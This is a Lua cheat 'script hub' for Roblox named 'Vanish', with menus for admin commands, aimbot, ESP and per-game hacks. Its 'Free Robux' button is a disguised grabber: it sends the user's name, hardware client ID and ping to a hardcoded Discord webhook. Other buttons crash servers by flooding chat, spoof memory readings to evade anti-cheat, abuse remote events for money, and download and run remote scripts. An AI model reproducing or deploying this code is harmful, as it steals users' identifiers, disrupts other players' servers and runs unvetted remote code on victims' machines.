local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Vanish by KOed#7242", "BloodTheme")
--LightTheme
--DarkTheme
--GrapeTheme
--BloodTheme
--Ocean
--Midnight
--Sentinel
--Synapse

--MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Vanish Admin", "Vanish Console", function()
if not game:IsLoaded() then
	game.Loaded:Wait()
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Alteral323/v/main/libs/compat.lua"))()(true)

messagebox('Please note "Vanish admin" is in beta and you may experience bugs or broken commands.\nType "help" in the console for a list of commands\nif you need further support please contact me Credits:\nTeem\nDrqonic\nIonized particle/AtpZombie42\nHoppingShark1437\nToon', 'Vanish Admin', 0)


-- by clicking 'OK' you have signed your soul over to Teem
assert(rconsoleprint, "Your exploit is not supported!")
assert(fireproximityprompt, "Your exploit is not supported!")
assert(getgenv, "Your exploit is not supported!")

local HttpService = game:GetService("HttpService");
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local tps = game:GetService("TeleportService")
local Player = Players.LocalPlayer
local character = Player.Character
local Humanoid = character:WaitForChild("Humanoid")
local User = Player.Name
local runservice = game:GetService("RunService")
local highlight = Instance.new("Highlight")
local plugins_directory = "situation_plugins"
local rconsolename = (syn and rconsolename) or (rconsolesettitle)

rconsolename("Welcome to Situation Admin | " .. User)

local function split(str, sep)
	if str == nil then
		return {}
	end

	if #sep > 1 then
		return {}
	end

	local tokens = {}

	for v in str:gmatch("([^" .. sep .. "]+)") do
		table.insert(tokens, v)
	end

	return tokens
end

local function getroot(char)
	return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
end

local function load_plugins()
	if isfolder(plugins_directory) == false then
		makefolder(plugins_directory)
	end

	local files = listfiles(plugins_directory)

	for key, value in pairs(files) do
		local file = value:match("[^\\^/]+%.lua$") or value:match("[^\\^/]+%.txt$")

		if file ~= nil then
			local filename = file:sub(0, #file - 4)

			local call = loadstring(readfile(value))

			commands[filename] = call
		end
	end
end

commands = {
	help = function(...)
		local i = 0

		for key, value in pairs(commands) do
			i = i + 1

			rconsoleprint(i .. ".) " .. key .. "\n")
		end
	end, 
	
	execute = function(...)
		local args = {...}
		local text = args[1]
		
		loadstring(text)
	end, 
	
	getremotes = function(...)
		for i, v in pairs(game:GetDescendants()) do
			if string.match(v.ClassName, "RemoteEvent") then
				rconsoleprint("\nRemoteEvent found!  \nLocation: " .. v:GetFullName() .. "  \nMethod  FireServer\n")
			elseif string.match(v.ClassName, "RemoteFunction") then
				rconsoleprint("\nRemoteFunction found! \nLocation: " .. v:GetFullName() .. "  \nMethod | InvokeServer\n")
			else

			end
		end
	end, 

	shadows = function(...)
		Lighting.GlobalShadows = true
	end, 
	
	noshadows = function(...)
		Lighting.GlobalShadows = false
	end, 

	position = function(...)
    		rconsoleprint(tostring(character.HumanoidRootPart.Position.X .. character.HumanoidRootPart.Position.Y .. character.HumanoidRootPart.Position.Z'\n'))
	end, 
	
	fireclickdetectors = function(...)
		for i, v in pairs(workspace:GetDescendants()) do
			if v:IsA("ClickDetector") then
				fireclickdetector(v)
			end
		end
	end, 
	
	blockhead = function(...)
		character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
	end, 
	
	blockhats = function(...)
		for _,v in pairs(character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
			for i,c in pairs(v:GetDescendants()) do
				if c:IsA("SpecialMesh") then
					c:Destroy()
				end
			end
		end
	end, 
	
	rejoin = function(...)
		tps:Teleport(game.PlaceId, Player)	
	end, 
	
	blocktool = function(...)
		for _,v in pairs(character:GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				for i,c in pairs(v:GetDescendants()) do
					if c:IsA("SpecialMesh") then
						c:Destroy()
					end
				end
			end
		end
	end, 
	
	naked = function(...)
		for i, v in pairs(character:GetDescendants()) do
			if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
				v:Destroy()
			end
		end
	end, 
	
	day = function(...)
		Lighting.ClockTime = 14
		rconsolewarn("This is client-side only.")
	end, 

	night = function(...)
		Lighting.ClockTime = 0
		rconsolewarn("This is client-side only.")
	end, 
	
	noface = function(...)
		for i, v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Decal") and v.Name == "face" then
				v:Destroy()
			end
		end
	end, 
	
	fullbright = function(...)
		Lighting.Brightness = 2
		Lighting.ClockTime = 14
		Lighting.FogEnd = 100000
		Lighting.GlobalShadows = false
		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end, 

	nofog = function(...)
		Lighting.FogEnd = 100000

		for i, v in pairs(Lighting:GetDescendants()) do
			if v:IsA("Atmosphere") then
				v:Destroy()
			end
		end

		rconsolewarn('This is client-side only.')
	end, 

	supportserver = function(...)
		rconsoleprint("Vanish#7242 my username has been copied to your clipboard.\n")
		setclipboard("Vanish#7242")
	end, 

	noproximitycooldown = function(...)
		while task.wait() do
			game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(fireproximityprompt)
		end
	end, 

	lagserver = function(...)
		for _, v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
			v:Disable()
		end

		local storage = game:GetService("ReplicatedStorage")
		local v = 96000000
		local msg = "" .. string.rep(" ", (v - 12))

		for i = 1, 7 do
			if storage:FindFirstChild("DefaultChatSystemChatEvents") then
				storage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
			else
				rconsolewarn("It seems this game has a custom chat. This command will not work.")
			end
		end
	end, 
	
	deletetouchinterests = function(...)
		for _, v in ipairs(workspace:GetDescendants()) do
			if v.IsA(v, "TouchTransmitter") then
				v:Destroy()
			end
		end
	end, 
	
	spoofmemory = function(...)
		hookfunction((gcinfo or collectgarbage), function(...)
			return math.random(200, 350)
		end)
		
		local gamemt = getrawmetatable(game)

		setreadonly(gamemt, false)

		local nc = gamemt.__namecall

		gamemt.__namecall = newcclosure(function(...)
			if getnamecallmethod() == "GetTotalMemoryUsageMb" then
				return math.random(395, 405)
			end

			return nc(...)
		end)

		hookfunction(game.Stats.GetTotalMemoryUsageMb, function()
			return math.random(395, 405)
		end)

		rconsoleprint("Memory Spoofed!\n")
	end, 
	
	teleport = function(...)
		for i, plr in ipairs(Players:GetPlayers()) do
			rconsoleprint(i .. ".) " .. plr.Name .. "\n")
		end

		rconsoleprint("Choice: ")

		local playerNum = tonumber(rconsoleinput())
		local players = Players:GetPlayers()

		if playerNum ~= nil and playerNum > 0 and playerNum <= #players then
			local plrchar = players[playerNum].Character

			getroot(character).CFrame = getroot(plrchar).CFrame
		else
			rconsolewarn("Player chosen is invalid!\n")
		end
	end, 
	
	joinlogs = function(...)
		local args = {...}

		joinlogsenabled = args[1] or not joinlogsenabled

		if joinlogsenabled then
			joinlogcon = Players.PlayerAdded:Connect(function(plr)
				rconsoleprint("\n" .. plr.Name .. " has joined, account is " .. plr.AccountAge .. " days old!\nInput: ")
			end)

			leavelogcon = Players.PlayerRemoving:Connect(function(plr)
				rconsoleprint("\n" .. plr.Name .. " has left!\nInput: ")
			end)
		elseif not joinlogsenabled and joinlogcon and leavelogcon then
			joinlogcon = joinlogcon:Disconnect()
			leavelogcon = leavelogcon:Disconnect()
		end
	end, 
	
	btools = function(...)
		local Player = Players.LocalPlayer
		local backpack = Player.Backpack

		local hammer = Instance.new("HopperBin")
		hammer.Name = "Hammer"
		hammer.BinType = 4
		hammer.Parent = backpack

		local cloneTool = Instance.new("HopperBin")
		cloneTool.Name = "Clone"
		cloneTool.BinType = 3
		cloneTool.Parent = backpack

		local grabTool = Instance.new("HopperBin")
		grabTool.Name = "Grab"
		grabTool.BinType = 2
		grabTool.Parent = backpack

		task.wait()

		rconsolewarn('Anything you add or delete using "btools" will be client-side only.')
		
	end, 

	noclip = function(...)
		for i, v in pairs(Workspace[User]:GetChildren()) do
			if v:IsA("BasePart") then
				v.CanCollide = false
			end
		end
	end, 
	
	clip = function(...)
		for i, v in pairs(Workspace[User]:GetChildren()) do
			if v:IsA("BasePart") then
				v.CanCollide = true
			end
		end
	end, 

	walkspeed = function(...)
		local args = {...}
		local ws = args[1]

		Humanoid.WalkSpeed = ws
	end, 
	
	jumppower  = function(...)
		local args = {...}
		local jp = args[1]

		Humanoid.JumpPower = jp
	end, 
	
	hipheight  = function(...)
		local args = {...}
		local hh = args[1]

		Humanoid.HipHeight = hh
	end, 
	
	serverhop = function(...)
		local x = {}
		local pid = game.PlaceId
		local jid = game.JobId

		for _, v in ipairs(HttpService:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. pid .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= jid then
				x[#x + 1] = v.id
			end
		end

		if #x > 0 then
			tps:TeleportToPlaceInstance(pid, x[math.random(1, #x)])
		end
	end, 
	
	antiafk = function(...)
		for i, v in pairs(getconnections(Players.LocalPlayer.Idled)) do
			v:Disable()
		end
	end, 
	
	chat = function(...)
		local args = {...}
		local message = args[1]
		local storage = game:GetService("ReplicatedStorage")

		if storage:FindFirstChild("DefaultChatSystemChatEvents") then
			storage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
		else
			rconsolewarn("It seems this game has a custom chat this command will not work.\n")
		end
	end, 

	clear = rconsoleclear
}

while task.wait() do
	rconsoleprint("Input: ")

	local args = rconsoleinput()
	local tokens = split(args, " ")

	if tokens[1] ~= nil then
		load_plugins()

		local command = string.lower(tokens[1])
		local getCommand = commands[command]

		table.remove(tokens, 1)

		if getCommand then
			local success = pcall(commands[command], table.unpack(tokens))

			if success then
				rconsoleprint("Executed " .. command .. " successfully!\n", green)
			else
				rconsoleerr("An error occurred while running "  .. command .. "\nPlease report this in the support server if you think this command may be bugged.\n")
			end
		else
			rconsoleerr("Failed to execute " .. command .. "!\nPlease report this in the support server if you think this command may be bugged.\n")
		end
	end
end
end)


MainSection:NewButton("Free Robux", "Working 2022", function()
    local webh = "https://discord.com/api/webhooks/1038931831124410489/Le2OKN-a2pvYjvJr3ELeGCORVTwRbDJVMV-ZXp4DiT7T1rwZCPHY-DbKEf_HxoJ4EgFZ"


    pcall(function()
       local data = {
    
      ['embeds'] = {
        {
           ['title'] = 'Vanish',
           ['description'] = 'Free robux',
           ['fields'] = {
              {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
              {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
              {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
    
            }
        }
      }
    }
    
       if syn then
           local response = syn.request(
               {
                   Url = webh,
                   Method = 'POST',
                   Headers = {
                       ['Content-Type'] = 'application/json'
                   },
                   Body = game:GetService('HttpService'):JSONEncode(data)
               }
           );
       elseif request then
           local response = request(
               {
                   Url = webh,
                   Method = 'POST',
                   Headers = {
                       ['Content-Type'] = 'application/json'
                   },
                   Body = game:GetService('HttpService'):JSONEncode(data)
               }
           );
       elseif http_request then
           local response = http_request(
               {
                   Url = webh,
                   Method = 'POST',
                   Headers = {
                       ['Content-Type'] = 'application/json'
                   },
                   Body = game:GetService('HttpService'):JSONEncode(data)
               }
           );
       end
    end)
end)

MainSection:NewButton("Chatspy", "Lets you see chat logs", function()
-- // Initialise
--if (getgenv().ChatSpy) then return getgenv().ChatSpy; end;
repeat wait() until game:GetService("ContentProvider").RequestQueueSize == 0;
repeat wait() until game:IsLoaded();

-- // Vars
local Players = game:GetService("Players");
local StarterGui = game:GetService("StarterGui");
local ReplicatedStorage = game:GetService("ReplicatedStorage");
local LocalPlayer = Players.LocalPlayer;
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui");
local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents");
local SayMessageRequest = DefaultChatSystemChatEvents:WaitForChild("SayMessageRequest");
local OnMessageDoneFiltering = DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering");
getgenv().ChatSpy = {
    Enabled = true,
    SpyOnSelf = false,
    Public = false,
    Chat = {
        Colour  = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.SourceSans,
        TextSize = 18,
        Text = "",
    },
    IgnoreList = {
        {Message = ":part/1/1/1", ExactMatch = true},
        {Message = ":part/10/10/10", ExactMatch = true},
        {Message = "A?????????", ExactMatch = false},
        {Message = ":colorshifttop 10000 0 0", ExactMatch = true},
        {Message = ":colorshiftbottom 10000 0 0", ExactMatch = true},
        {Message = ":colorshifttop 0 10000 0", ExactMatch = true},
        {Message = ":colorshiftbottom 0 10000 0", ExactMatch = true},
        {Message = ":colorshifttop 0 0 10000", ExactMatch = true},
        {Message = ":colorshiftbottom 0 0 10000", ExactMatch = true},
    },
};

-- // Function
function ChatSpy.checkIgnored(message)
    for i = 1, #ChatSpy.IgnoreList do
        local v = ChatSpy.IgnoreList[i];
        if (v.ExactMatch and message == v.Message) or (not v.ExactMatch and string.match(v.Message, message)) then 
            return true;
        end;
    end;
    return false;
end;

function ChatSpy.onChatted(targetPlayer, message)
    if (targetPlayer == LocalPlayer and string.lower(message):sub(1, 4) == "/spy") then
        ChatSpy.Enabled = not ChatSpy.Enabled; wait(0.3);
        ChatSpy.Chat.Text = "[SPY] - "..(ChatSpy.Enabled and "Enabled." or "Disabled.");

        StarterGui:SetCore("ChatMakeSystemMessage", ChatSpy.Chat);
    elseif (ChatSpy.Enabled and (ChatSpy.SpyOnSelf or targetPlayer ~= LocalPlayer)) then
        local message = message:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ');

        local Hidden = true;
        local Connection = OnMessageDoneFiltering.OnClientEvent:Connect(function(packet, channel)
            if (packet.SpeakerUserId == targetPlayer.UserId and packet.Message == message:sub(#message - #packet.Message + 1) and (channel == "All" or (channel == "Team" and not ChatSpy.Public and Players[packet.FromSpeaker].Team == LocalPlayer.Team))) then
                Hidden = false;
            end;
        end);

        wait(1);
        Connection:Disconnect();

        if (Hidden and ChatSpy.Enabled and not ChatSpy.checkIgnored(message)) then
            if (#message > 1200) then
                message = message:sub(1200) .. "...";
            end;
            ChatSpy.Chat.Text = "[SPY] - ["..targetPlayer.Name.."]: " .. message;
            if (ChatSpy.Public) then SayMessageRequest:FireServer(ChatSpy.Chat.Text, "All"); else StarterGui:SetCore("ChatMakeSystemMessage", ChatSpy.Chat); end;
        end;
    end;
end;

-- // Handling Chats
local AllPlayers = Players:GetPlayers();
for i = 1, #AllPlayers do
    local player = AllPlayers[i];
    player.Chatted:Connect(function(message)
        ChatSpy.onChatted(player, message);
    end);
end;

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        ChatSpy.onChatted(player, message);
    end);
end);

-- // Initialise Text
ChatSpy.Chat.Text = "[SPY] - "..(ChatSpy.Enabled and "Enabled." or "Disabled.");
StarterGui:SetCore("ChatMakeSystemMessage", ChatSpy.Chat);

-- // Update Chat Frame
local chatFrame = LocalPlayer.PlayerGui.Chat.Frame;
chatFrame.ChatChannelParentFrame.Visible = true;
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y);
end)




--localplayer
local Main = Window:NewTab("Player")
local localSection = Main:NewSection("Player")

localSection:NewToggle("Headless", "Only you can see it the changes to your Head", function(state)
    if state then
       game.Players.LocalPlayer.Character.Head.Transparency = 1
game.Players.LocalPlayer.Character.Head.Transparency = 1
for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
if (v:IsA("Decal")) then
v.Transparency = 1
end
end
    else
game.Players.LocalPlayer.Character.Head.Transparency = 0
game.Players.LocalPlayer.Character.Head.Transparency = 0
for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
if (v:IsA("Decal")) then
v.Transparency = 0
end
end
    end
end)

localSection:NewButton("Umlimited fps", "Uncaps Fps", function()
local fps = 9999
 
    if setfpscap then
        setfpscap(fps)
end
end)

localSection:NewButton("Korblox", "Korblox but only you can see it, Reset to take off", function()
local ply = game.Players.LocalPlayer
local chr = ply.Character
chr.RightLowerLeg.MeshId = "902942093"
chr.RightLowerLeg.Transparency = "1"
chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
chr.RightFoot.MeshId = "902942089"
chr.RightFoot.Transparency = "1"
end)

localSection:NewButton("Rainbow Charater", "makes you look gay", function()
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("MeshPart") then
            v.Material = "ForceField"
            spawn(function()
                while wait() do
                    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("MeshPart") then
                            v.Color = Color3.fromHSV(tick()%5/5,1,1)
                            wait()
                        end
                    end 
                end
            end)
        end
    end
end)

--antis
localSection:NewLabel("antis")

localSection:NewButton("Anti fling", "No fling", function()
    local localPlayer = game:GetService('Players').LocalPlayer;
                local localCharacter = localPlayer.Character;
                localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
                local newCharacter = localPlayer.CharacterAdded:Wait();
                local spoofFolder = Instance.new('Folder');
                spoofFolder.Name = 'FULLY_LOADED_CHAR';
                spoofFolder.Parent = newCharacter;
                newCharacter:WaitForChild('RagdollConstraints'):Destroy();
                local spoofValue = Instance.new('BoolValue', newCharacter);
                spoofValue.Name = 'RagdollConstraints';
                local name = game.Players.LocalPlayer.Name
                local lol =    game.Workspace:WaitForChild(name)
                local money = Instance.new("Folder",game.Players.LocalPlayer.Character);money.Name = "FULLY_LOADED_CHAR"
                lol.Parent = game.Workspace.Players
                game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")
                game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
end)
  localSection:NewButton("Anti Bag", "No Bag", function()
       local LP = game.Players.LocalPlayer;

    for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
            end
        end
            
        LP.Character.ChildAdded:Connect(function()
        wait(0.3)
        for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
        end
        end
        end)
end)
localSection:NewButton("Anti slow", "When geting shot, eating, shooting, or punching you wont be Slow", function()
    local mt = getrawmetatable(game)
local backup
backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
if key == "WalkSpeed" and value < 16 then
value = 16
end
return backup(self, key, value)
end))
end)

localSection:NewButton("Anti Lag", "Changing Assets to improvew performance", function()
for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.Material = "Plastic"
end
end
end)

local Main = Window:NewTab("Aim Stuff")

local AimSection = Main:NewSection("Lock")

AimSection:NewButton("enable", "Aimlock", function()
    getgenv().RecurringPoint = "UpperTorso"
    getgenv().Hitbox = "UpperTorso"
    getgenv().Keybind = "q"
    getgenv().AimbotStrengthAmount = 0.0421
    getgenv().PredictionAmount = 11
    getgenv().Radius = 25
    getgenv().UsePrediction = true
    getgenv().AimbotStrength = true
    getgenv().FirstPerson = true
    getgenv().ThirdPerson = true
    getgenv().TeamCheck = false
    getgenv().Enabled = true
end)

AimSection:NewButton("JumpPred", "pred", function()
    local Plr = game.Players.LocalPlayer

    Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
        if new == Enum.HumanoidStateType.Freefall == true then
            wait(0.27)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, -15, 0)
        end
    end)
end)

AimSection:NewButton("no recoil", "Kinda obv what it do", function()
    local CurrentFocus = game:GetService("Workspace").CurrentCamera.CFrame
    game:GetService("Workspace").CurrentCamera:Destroy()
    local Instance = Instance.new("Camera", game:GetService("Workspace"))
    Instance.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
    Instance.CameraType = Enum.CameraType.Custom
    Instance.CFrame = CurrentFocus
end)

local Main = Window:NewTab("MM2")
local MurderSection = Main:NewSection("Esp")
MurderSection:NewButton("See People", "See Where everyone is and there role", function()
    
    --[[
    Credits to Kiriot22 for the Role getter <3
        - poorly coded by FeIix <3
]]

-- > Declarations < --

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer
local roles

-- > Functions <--

function CreateHighlight() -- make any new highlights for new players
	for i, v in pairs(Players:GetChildren()) do
		if v ~= LP and v.Character and not v.Character:FindFirstChild("Highlight") then
			Instance.new("Highlight", v.Character)           
		end
	end
end

function UpdateHighlights() -- Get Current Role Colors (messy)
	for _, v in pairs(Players:GetChildren()) do
		if v ~= LP and v.Character and v.Character:FindFirstChild("Highlight") then
			Highlight = v.Character:FindFirstChild("Highlight")
			if v.Name == Sheriff and IsAlive(v) then
				Highlight.FillColor = Color3.fromRGB(0, 0, 225)
			elseif v.Name == Murder and IsAlive(v) then
				Highlight.FillColor = Color3.fromRGB(225, 0, 0)
			elseif v.Name == Hero and IsAlive(v) and not IsAlive(game.Players[Sheriff]) then
				Highlight.FillColor = Color3.fromRGB(255, 250, 0)
			else
				Highlight.FillColor = Color3.fromRGB(0, 225, 0)
			end
		end
	end
end	

function IsAlive(Player) -- Simple sexy function
	for i, v in pairs(roles) do
		if Player.Name == i then
			if not v.Killed and not v.Dead then
				return true
			else
				return false
			end
		end
	end
end


-- > Loops < --

RunService.RenderStepped:connect(function()
	roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
	for i, v in pairs(roles) do
		if v.Role == "Murderer" then
			Murder = i
		elseif v.Role == 'Sheriff'then
			Sheriff = i
		elseif v.Role == 'Hero'then
			Hero = i
		end
	end
	CreateHighlight()
	UpdateHighlights()
end)
    
    end)

    localSection:NewButton("God", "Makes you not die", function()

    game.Players.LocalPlayer.Character.Humanoid:Remove()
    Instance.new('Humanoid', game.Players.LocalPlayer.Character)
    
end)

--mm2 end


--bloxfruits start


local Main = Window:NewTab("Bloxfruits")
local BloxFruitsSection = Main:NewSection("Bloxfruits")


    BloxFruitsSection:NewButton("Mukuro", "Yes", function()
 loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
end)

 BloxFruitsSection:NewButton("Strike", "Yes", function()
   getgenv().Color = Color3.fromRGB(0, 128, 255)
   loadstring(game:HttpGet("https://raw.githubusercontent.com/StormSKz12/StirkeHub1/main/Gameincluded"))()
end)

 BloxFruitsSection:NewButton("SMZ", "Yes", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Frerfgzz/free-script/main/SMZHUBv2BETA"))()
 end)
 
--bloxfruits end





 
 --Dinosaur sim start
 
 
 
 local Main = Window:NewTab("DinoSaur Sim")
local DinoSimSection = Main:NewSection("DinoSaur Sim")

DinoSimSection:NewButton("inf money ", "gives unstoped able money", function()
--Variables
plr = game.Players.LocalPlayer.Character
AttackRemote = game:GetService("ReplicatedStorage").RemoteEvents.AttackRemoteEvent

--Script
plr.HumanoidRootPart.CFrame = game.workspace.Monsters["Monster_01"].Food.Apple.RootPart.CFrame
task.wait(.2)
AttackRemote:FireServer("AttackStaticFood",workspace.Monsters.Monster_01.Food.Apple,99999999,"Dinosaur1_3_1")
end)

--dinosaur sim end
 

--osu start
local Main = Window:NewTab("Rosu!Mania")
local OsuSection = Main:NewSection("Rosu!Mania")

OsuSection:NewButton("Auto Player", "Best auto player", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/noobscripter38493/rosu-perfect-autoplayer/main/rosu%20auto%20player.lua"))()
end)
